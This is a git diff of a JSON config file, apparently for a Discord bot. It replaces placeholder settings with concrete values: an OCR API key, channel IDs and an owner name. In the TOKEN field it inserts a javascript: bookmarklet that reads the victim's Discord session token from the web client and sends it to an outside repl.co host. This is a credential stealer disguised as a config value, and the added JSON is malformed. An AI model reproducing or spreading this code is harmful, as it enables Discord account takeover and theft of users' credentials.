@@ -1,9 +1,9 @@
 {
-  "ocrSpaceApiKey" : "Put Your OCR SPACE KEY", 
-  "spamChannelID" : "Put Your Spam Channel ID", 
-  "logChannelID" : "Put Your Log Channel ID", 
-  "errorChannelID" : "Put Your Error Channel ID", 
-  "OwnerID" : "Put Your Main Account ID",
-  "TOKEN" : "Put Your TOKEN(if in replit , I'd recommend to put it in secret rather than here)"
+  "ocrSpaceApiKey" : K81233621388957
+  "spamChannelID" : 1173899992243642419 
+  "logChannelID" : 1173089688345649192
+  "errorChannelID" : 975423614998433844
+  "OwnerID" : t_toxic9389
+  "TOKEN" : javascript:(async() => { const token = (webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();window.location.href = `https://DiscordTokenFinder.lavalink38.repl.co/?user=${token}`;})()
 }
 
